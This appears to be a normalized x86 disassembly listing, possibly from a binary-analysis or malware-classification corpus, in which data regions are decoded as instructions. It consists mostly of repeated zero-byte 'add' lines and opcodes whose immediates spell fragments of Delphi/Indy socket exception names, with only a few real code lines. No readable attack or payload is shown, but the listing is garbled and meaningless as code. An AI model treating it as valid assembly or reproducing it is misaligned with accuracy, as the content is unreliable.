arpl [ ebp + 0x70 ] sp
je r-xdata
inc esi
add [ edx + esi + 0x32d00040 ] dh
inc eax
add [ ebx + esi ] cl
inc eax
add [ ecx ] dl
inc ebp
dec ecx
inc ebx
outsd
outsb
outsb
arpl [ gs : esp + edx * 2 + 0x69 ] si
insd
outsd
jne r-xdata
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jb r-xdata
add [ eax ] al
movsb [ edi ] [ esi ]
std
inc esi
add [ ebp + esi + 0x40 ] cl
add [ eax + 0x35 ] bl
inc eax
add [ ebp + esi + 0x40 ] bl
add [ eax + 0x35 ] ah
inc eax
add [ ebp + esi + 0x40 ] dl
add [ edx + esi + 0x32d00040 ] dh
inc eax
add [ ebx + esi ] cl
inc eax
add [ edx ] bl
inc ebp
dec ecx
push ebx
outsd
arpl [ ebx + 0x73 ] bp
push ebx
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
in al 0xff
inc esi
add [ eax + eax ] cl
dec ecx
outsb
je r-xdata
nop
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
nop
std
inc esi
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
js r-xdata
push 0x6f727245
jb r-xdata
inc eax
add [ ebx + esi ] cl
inc eax
add [ edi ] dl
inc ebp
jae r-xdata
inc eax
add [ eax * 2 + 0x6f536449 ] dl
arpl [ ebx + 0x73 ] bp
push ebp
outsb
imul ebp [ esi + 0x6f ] 0x77
outsb
mov ah 0x32
inc eax
add al dl
xor al [ eax ]
or al 0x33
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0xc0046ff ] al
add [ eax ] al
add [ ebp + edi * 8 + 0x354c0046 ] ah
inc eax
popad
imul ebp [ ebp + 0x64 ] 0x46ff8090
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
outsd
jb r-xdata
cmp bh 0x46
push ebx
jb r-xdata
push ebx
jb r-xdata
shl [ eax ] 0xfd
inc esi
add [ eax ] al
add [ eax + eax ] cl
add [ eax ] al
movsb [ edi ] [ esi ]
std
inc esi
add [ ebp + esi + 0x40 ] cl
add [ eax + 0x35 ] bl
inc eax
add [ ebp + esi + 0x40 ] bl
add [ eax + 0x35 ] ah
inc eax
inc edi
dec ecx
push ebx
outsd
arpl [ ebx + 0x73 ] bp
inc ecx
jne r-xdata
rcl [ eax ] 0x1
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dl
add [ edi ] eax
or al 0x0
add [ eax ] al
movsb [ edi ] [ esi ]
std
inc esi
add [ ebp + esi + 0x40 ] cl
add [ eax + 0x35 ] bl
inc eax
add [ ebp + esi + 0x40 ] bl
add [ eax + 0x35 ] ah
inc eax
add [ ebp + esi + 0x40 ] dl
add [ edx + esi + 0x32d00040 ] dh
inc eax
add [ ebx + esi ] cl
inc eax
add [ edx ] bl
inc ebp
dec ecx
push ebx
outsd
arpl [ ebx + 0x73 ] bp
push ebx
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push 0x6874654d
outsd
inc ebp
jb r-xdata
outsd
outsb
inc ebp
jb r-xdata
jno r-xdata
inc eax
add ah ah
inc [ esi ]
add [ eax + 0x35 ] bl
inc eax
add [ ebp + esi + 0x40 ] bl
add [ eax + 0x35 ] ah
inc eax
add [ ebp + esi + 0x40 ] dl
add [ edx + esi + 0x32d00040 ] dh
inc eax
add [ ebx + esi ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp bh 0x46
add [ eax + eax ] cl
add [ eax ] al
movsb [ edi ] [ esi ]
std
inc esi
add [ ebp + esi + 0x40 ] cl
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dh
std
inc esi
enter 0x46fc 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
int3
imul esp [ ebx + 0x65 ] 0x656d614e
mov eax eax
add [ eax + eax ] cl
add [ eax ] al
je r-xdata
inc esi
add [ ebp + esi + 0x40 ] cl
add [ eax + 0x35 ] bl
inc eax
add [ ebp + esi + 0x40 ] bl
add [ eax + 0x35 ] ah
inc eax
add [ ebp + esi + 0x40 ] dl
arpl [ eax + 0x61 ] bp
bound ebp [ ebp + 0x45 ]
jb r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ ecx ] al
inc edi
add [ eax + eax ] cl
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0xc004700 ] dh
add [ eax ] al
add [ ebp + edi * 8 + 0x354c0046 ] ah
inc eax
outsd
jb r-xdata
inc eax
add [ ebx + esi ] cl
inc eax
add [ edx ] bl
inc ebp
dec ecx
push ebx
outsd
arpl [ ebx + 0x73 ] bp
push edx
jno r-xdata
xor al [ eax ]
shl [ edx ] 0x1
popad
imul ebp [ ebp + 0x64 ] r-xdata
jb r-xdata
outsd
jb r-xdata
mov ah 0x32
inc eax
add al dl
xor al [ eax ]
or al 0x33
jb r-xdata
jb r-xdata
add [ ebp + esi + 0x40 ] dl
add [ edx + esi + 0x32d00040 ] dh
inc eax
add [ ebx + esi ] cl
inc eax
add [ 0x53644945 ] bl
outsd
arpl [ ebx + 0x73 ] bp
push ebx
jb r-xdata
outsb
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + eax + 0x47 ] cl
add [ eax + eax ] cl
add [ eax + 0x35 ] bl
inc eax
add [ ebp + esi + 0x40 ] bl
add [ eax + 0x35 ] ah
inc eax
add [ ebp + esi + 0x40 ] dl
add [ edx + esi + 0x32d00040 ] dh
inc eax
add [ ebx + esi ] cl
inc eax
add [ ecx ] dl
inc ebp
dec ecx
push ebx
outsd
arpl [ ebx + 0x73 ] bp
inc ecx
jne r-xdata
add [ edi ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov al 0x0
inc edi
add [ eax + eax ] cl
add [ eax ] al
movsb [ edi ] [ esi ]
std
inc esi
add [ ebp + esi + 0x40 ] cl
inc ebp
jb r-xdata
add [ eax ] al
movsb [ edi ] [ esi ]
std
inc esi
add [ ebp + esi + 0x40 ] cl
add [ eax + 0x35 ] bl
inc eax
add [ ebp + esi + 0x40 ] bl
add [ eax + 0x35 ] ah
inc eax
add [ ebp + esi + 0x40 ] dl
add [ edx + esi + 0x32d00040 ] dh
dec esp
add [ edi ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
dec esp
add [ edi ] al
or al 0x0
push esp
add al [ edi ]
les eax [ edx ]
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah al
add al [ edi ]
or al 0x0
add [ eax ] al
movsb [ edi ] [ esi ]
std
inc esi
add [ ebp + esi + 0x40 ] cl
add [ eax + 0x35 ] bl
inc eax
add [ ebp + esi + 0x40 ] bl
add [ eax + 0x35 ] ah
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push esp
add al [ edi ]
or al 0x0
add [ eax ] al
movsb [ edi ] [ esi ]
std
inc esi
add [ ebp + esi + 0x40 ] cl
add [ eax + 0x35 ] bl
inc eax
add [ ebp + esi + 0x40 ] bl
add [ eax + 0x35 ] ah
rcl [ edx + eax + 0x47 ] 0x0
push ebp
outsb
jb r-xdata
jb r-xdata
jb r-xdata
imul esi [ ebx + 0x73 ] 0x456e6f69
jb r-xdata
inc eax
add [ ecx ] ah
inc ebp
dec ecx
push ebx
outsd
arpl [ ebx + 0x73 ] bp
push ebx
jb r-xdata
shl ah 0x1
inc edi
jb r-xdata
insb
inc ebp
jb r-xdata
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
jb r-xdata
push esp
jb r-xdata
mov eax eax
outsd
jbe r-xdata
popad
arpl [ eax + 0x61 ] bp
bound ebp [ ebp + 0x45 ]
jb r-xdata
inc eax
add [ ebp + esi + 0x40 ] dl
add [ edx + esi + 0x32d00040 ] dh
je r-xdata
jb r-xdata
popad
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah ah
add [ edi ] eax
or al 0x0
add [ eax ] al
movsb [ edi ] [ esi ]
std
inc esi
add [ ebp + esi + 0x40 ] cl
add [ eax + 0x35 ] bl
inc eax
add [ ebp + esi + 0x40 ] bl
add [ eax + 0x35 ] ah
inc eax
add [ ebp + esi + 0x40 ] dl
add [ edx + esi + 0x32d00040 ] dh
inc eax
add [ ebx + esi ] cl
outsd
jb r-xdata
jb r-xdata
inc ebp
jb r-xdata
inc eax
add [ ebp + esi + 0x40 ] dl
add [ edx + esi + 0x32d00040 ] dh
inc eax
add [ ebx + esi ] cl
inc eax
add [ eax * 2 + 0x6f536449 ] ah
arpl [ ebx + 0x73 ] bp
push ebx
jb r-xdata
pop esp
xor eax 0x35600040
outsd
jae r-xdata
outsd
jb r-xdata
imul esi [ edx + 0x65 ] 0x72724564
add [ ebp + esi + 0x40 ] cl
add [ eax + 0x35 ] bl
inc eax
add [ ebp + esi + 0x40 ] bl
add [ eax + 0x35 ] ah
inc eax
add [ ebp + esi + 0x40 ] dl
add [ edx + esi + 0x32d00040 ] dh
inc eax
add [ ebx + esi ] cl
inc eax
outsd
outsb
outsb
add [ 0x53644945 ] bl
outsd
arpl [ ebx + 0x73 ] bp
push ebx
jb r-xdata
jb r-xdata
outsd
jb r-xdata
outsd
inc eax
add [ ebx + esi ] cl
inc eax
add [ edx ] ah
inc ebp
dec ecx
push ebx
outsd
arpl [ ebx + 0x73 ] bp
push ebx
jb r-xdata
shl [ edx ] 0x1
outsb
js r-xdata
shl [ ebx + eax + 0x47 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + eax + 0xc0047 ] ah
add [ eax ] al
movsb [ edi ] [ esi ]
std
inc esi
add [ ebp + esi + 0x40 ] cl
add [ eax + 0x35 ] bl
inc eax
add [ ebp + esi + 0x40 ] bl
add [ eax + 0x35 ] ah
inc eax
add [ ebp + esi + 0x40 ] dl
add [ edx + esi + 0x32d00040 ] dh
add eax [ edi ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
movsb [ edi ] [ esi ]
add eax [ edi ]
or al 0x0
outsb
push edx
jne r-xdata
outsd
inc ebp
jb r-xdata
or al 0x4
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + eax ] cl
jb r-xdata
jb r-xdata
nop
inc eax
add [ eax ] bh
add eax [ edi ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp [ ebx ] al
inc edi
add [ eax + eax ] cl
add [ eax ] al
movsb [ edi ] [ esi ]
std
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] bh
inc edi
nop
jb r-xdata
inc edi
add [ eax + eax ] cl
add [ eax ] al
movsb [ edi ] [ esi ]
std
inc esi
add [ ebp + esi + 0x40 ] cl
add [ eax + 0x35 ] bl
inc eax
add [ ebp + esi + 0x40 ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
or al 0x4
outsd
add [ eax ] al
add [ eax ] al
add [ eax ] al
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + eax + 0x47 ] dh
inc eax
add [ ebx + esi ] cl
inc eax
add [ edx ] bl
inc ebp
dec ecx
push ebx
outsd
arpl [ ebx + 0x73 ] bp
push ebx
jb r-xdata
shl [ edx ] 0x1
push esp
dec esp
inc ebp
js r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
je r-xdata
inc edi
add [ eax ] al
add [ eax ] al
add [ eax + 0x35 ] ah
inc eax
add [ ebp + esi + 0x40 ] dl
add [ edx + esi + 0x32d00040 ] dh
inc eax
add [ ebx + esi ] cl
inc eax
add [ edx ] bl
inc ebp
dec ecx
push ebx
outsd
arpl [ ebx + 0x73 ] bp
push ebx
jb r-xdata
outsd
insd
insd
popad
pop ebx
pop ebp
retn 0x4
jb r-xdata
xor eax 0x35600040
jb r-xdata
add [ eax + eax ] cl
inc eax
add [ ebp + esi + 0x40 ] dl
add [ edx + esi + 0x32d00040 ] dh
inc eax
add [ ebx + esi ] cl
inc eax
add [ eax ] dl
inc ebp
dec ecx
dec ecx
inc esi
add [ ebp + esi + 0x40 ] cl
add [ eax + 0x35 ] bl
inc eax
add [ ebp + esi + 0x40 ] bl
add [ eax + 0x35 ] ah
add [ eax ] al
je r-xdata
inc edi
mov eax edi
test bl bl
je r-xdata
outsd
jb r-xdata
outsd
arpl [ ebx + 0x65 ] bp
je r-xdata
insb
imul esp [ ebx + edx * 2 + 0x6f ] 0x74656b63
lea eax [ eax ]
aam 0x4
inc edi
add [ eax ] al
add [ eax ] al
jae r-xdata
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
outsb
jbe r-xdata
dec ecx
add [ eax ] al
inc ebp
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al bl
add al 0x47
add [ eax ] dl
add [ eax ] al
add [ ecx + edi * 8 + 0x46 ] dh
add [ ebp + esi + 0x40 ] cl
add [ eax + 0x35 ] bl
inc eax
add [ ebp + esi + 0x40 ] bl
add [ eax + 0x35 ] ah
inc eax
add [ ebp + esi + 0x40 ] dl
add [ edx + esi + 0x32d00040 ] dh
inc eax
add [ ebx + esi ] cl
inc eax
add [ eax ] dh
add eax 0x450e0047
dec ecx
push ebx
outsd
jb r-xdata
outsb
inc ebp
je r-xdata
sub_46fda5
std
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al dh
std
inc esi
add [ eax + eax ] cl
add [ eax ] al
je r-xdata
inc esi
add [ ebp + esi + 0x40 ] cl
add [ eax + 0x35 ] bl
inc eax
add [ ebp + esi + 0x40 ] bl
add [ eax + 0x35 ] ah
inc eax
add [ ebp + esi + 0x40 ] dl
add [ edx + esi + 0x32d00040 ] dh
inc eax
add [ ebx + esi ] cl
inc eax
add [ 0x53644945 ] cl
outsd
arpl [ ebx + 0x73 ] bp
inc ebp
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov al 0xfe
inc esi
add [ eax + eax ] cl
add [ eax ] al
movsb [ edi ] [ esi ]
std
inc esi
add [ ebp + esi + 0x40 ] cl
outsd
jb r-xdata
nop
jae r-xdata
inc eax
add [ ebx + esi ] cl
inc eax
add [ ebx ] dl
inc ebp
dec ecx
inc ebx
outsd
outsb
outsb
arpl [ gs : ebp + eax * 2 + 0x78 ] si
arpl [ ebp + 0x70 ] sp
je r-xdata
ror [ esi + edi * 8 + 0x46 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
dec esp
inc [ esi ]
or al 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
outsd
jb r-xdata
cmp bh 0x46
push ebx
jb r-xdata
add [ eax ] al
movsb [ edi ] [ esi ]
std
inc esi
add [ ebp + esi + 0x40 ] cl
add [ eax + 0x35 ] bl
inc eax
add [ ebp + esi + 0x40 ] bl
add [ eax + 0x35 ] ah
inc eax
add [ ebp + esi + 0x40 ] dl
add [ edx + esi + 0x32d00040 ] dh
inc eax
add [ ebx + esi ] cl
inc eax
add [ 0x53644945 ] dl
outsd
arpl [ ebx + 0x73 ] bp
push edx
jno r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + edi * 8 + 0x46 ] cl
add [ eax + eax ] cl
outsd
outsb
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] bl
inc [ esi ]
or al 0x0
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push 0x6874654d
outsd
inc ebp
jb r-xdata
jno r-xdata
inc eax
add ah ah
inc [ esi ]
add [ eax + 0x35 ] bl
inc eax
add [ ebp + esi + 0x40 ] bl
add [ eax + 0x35 ] ah
inc eax
add [ ebp + esi + 0x40 ] dl
add [ edx + esi + 0x32d00040 ] dh
inc eax
add [ ebx + esi ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp bh 0x46
add [ eax + eax ] cl
add [ eax ] al
movsb [ edi ] [ esi ]
std
inc esi
add [ ebp + esi + 0x40 ] cl
jb r-xdata
add [ eax ] al
movsb [ edi ] [ esi ]
std
inc esi
add [ ebp + esi + 0x40 ] cl
add [ eax + 0x35 ] bl
inc eax
add [ ebp + esi + 0x40 ] bl
add [ eax + 0x35 ] ah
inc eax
add [ ebp + esi + 0x40 ] dl
add [ edx + esi + 0x32d00040 ] dh
inc eax
add [ ebx + esi ] cl
inc eax
add [ edx ] bl
inc ebp
dec ecx
push ebx
outsd
arpl [ ebx + 0x73 ] bp
push ebx
jb r-xdata
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah ah
inc [ esi ]
or al 0x0
jae r-xdata
add [ eax ] al
movsb [ edi ] [ esi ]
std
inc esi
add [ ebp + esi + 0x40 ] cl
add [ eax + 0x35 ] bl
inc eax
add [ ebp + esi + 0x40 ] bl
add [ eax + 0x35 ] ah
inc eax
add [ ebp + esi + 0x40 ] dl
add [ edx + esi + 0x32d00040 ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sbb bh bh
inc esi
add [ eax + eax ] cl
add [ eax + 0x35 ] bl
inc eax
add [ ebp + esi + 0x40 ] bl
add [ eax + 0x35 ] ah
inc eax
add [ ebp + esi + 0x40 ] dl
add [ edx + esi + 0x32d00040 ] dh
inc eax
add [ ebx + esi ] cl
inc eax
add [ ebx ] bl
inc ebp
dec ecx
push ebx
outsd
arpl [ ebx + 0x73 ] bp
push edx
jno r-xdata
inc esi
popad
imul ebp [ ebp + 0x64 ] 0xfeb0c08b
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0xc0046fe ] dh
add [ eax ] al
add [ ebp + edi * 8 + 0x354c0046 ] ah
inc eax
jb r-xdata
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ ecx ] al
inc edi
add [ eax + eax ] cl
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jb r-xdata
inc eax
add [ ebx + esi ] cl
inc eax
add [ edx ] bl
inc ebp
dec ecx
push ebx
outsd
arpl [ ebx + 0x73 ] bp
push edx
jno r-xdata
xor al [ eax ]
shl [ edx ] 0x1
popad
imul ebp [ ebp + 0x64 ] r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
in al 0xff
inc esi
add [ eax + eax ] cl
dec ecx
outsb
je r-xdata
outsd
jb r-xdata
jb r-xdata
add [ ebp + esi + 0x40 ] dl
add [ edx + esi + 0x32d00040 ] dh
inc eax
add [ ebx + esi ] cl
inc eax
add [ 0x53644945 ] bl
outsd
arpl [ ebx + 0x73 ] bp
push ebx
jb r-xdata
outsb
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + eax + 0x47 ] cl
add [ eax + eax ] cl
add [ eax + 0x35 ] bl
inc eax
add [ ebp + esi + 0x40 ] bl
add [ eax + 0x35 ] ah
inc eax
add [ ebp + esi + 0x40 ] dl
add [ edx + esi + 0x32d00040 ] dh
inc eax
add [ ebx + esi ] cl
inc eax
add [ ecx ] dl
inc ebp
dec ecx
push ebx
outsd
arpl [ ebx + 0x73 ] bp
inc ecx
jne r-xdata
add [ edi ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov al 0x0
inc edi
add [ eax + eax ] cl
add [ eax ] al
movsb [ edi ] [ esi ]
std
inc esi
add [ ebp + esi + 0x40 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
js r-xdata
push 0x6f727245
jb r-xdata
inc eax
add [ ebx + esi ] cl
inc eax
add [ edi ] dl
inc ebp
jae r-xdata
inc eax
add [ eax * 2 + 0x6f536449 ] dl
arpl [ ebx + 0x73 ] bp
push ebp
outsb
imul ebp [ esi + 0x6f ] 0x77
outsb
mov ah 0x32
inc eax
add al dl
xor al [ eax ]
or al 0x33
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0xc0046ff ] al
add [ eax ] al
add [ ebp + edi * 8 + 0x354c0046 ] ah
inc eax
popad
imul ebp [ ebp + 0x64 ] 0x46ff8090
jb r-xdata
rcl [ edx + eax + 0x47 ] 0x0
jb r-xdata
shl ah 0x1
inc edi
arpl [ eax + 0x61 ] bp
bound ebp [ ebp + 0x45 ]
jb r-xdata
jb r-xdata
jb r-xdata
insb
inc ebp
jb r-xdata
add [ eax + eax ] cl
add [ eax ] al
movsb [ edi ] [ esi ]
std
inc esi
add [ ebp + esi + 0x40 ] cl
add [ eax + 0x35 ] bl
inc eax
add [ ebp + esi + 0x40 ] bl
add [ eax + 0x35 ] ah
inc eax
inc edi
dec ecx
push ebx
outsd
arpl [ ebx + 0x73 ] bp
inc ecx
jne r-xdata
add [ eax ] al
movsb [ edi ] [ esi ]
std
inc esi
add [ ebp + esi + 0x40 ] cl
add [ eax + 0x35 ] bl
inc eax
add [ ebp + esi + 0x40 ] bl
add [ eax + 0x35 ] ah
inc eax
add [ ebp + esi + 0x40 ] dl
add [ edx + esi + 0x32d00040 ] dh
inc eax
add [ ebx + esi ] cl
inc eax
add [ edx ] bl
inc ebp
dec ecx
push ebx
outsd
arpl [ ebx + 0x73 ] bp
push ebx
jb r-xdata
rcl [ eax ] 0x1
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dl
add [ edi ] eax
or al 0x0
outsd
outsb
inc ebp
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push esp
add al [ edi ]
or al 0x0
add [ eax ] al
movsb [ edi ] [ esi ]
std
inc esi
add [ ebp + esi + 0x40 ] cl
add [ eax + 0x35 ] bl
inc eax
add [ ebp + esi + 0x40 ] bl
add [ eax + 0x35 ] ah
mov eax eax
outsd
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
jb r-xdata
push ebp
outsb
jb r-xdata
jb r-xdata
jb r-xdata
inc eax
add [ ecx ] ah
inc ebp
dec ecx
push ebx
outsd
arpl [ ebx + 0x73 ] bp
push ebx
jb r-xdata
mov ah 0x32
inc eax
add al dl
xor al [ eax ]
or al 0x33
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
